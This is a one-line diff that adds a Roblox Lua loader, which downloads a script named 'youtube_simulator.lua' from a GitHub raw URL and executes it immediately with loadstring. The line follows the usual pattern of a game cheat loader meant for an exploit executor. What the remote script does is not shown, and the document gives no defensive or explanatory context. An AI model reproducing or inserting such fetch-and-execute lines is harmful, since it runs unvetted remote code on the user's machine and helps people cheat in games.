@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LeoKholYt/roblox/main/youtube_simulator.lua"))()
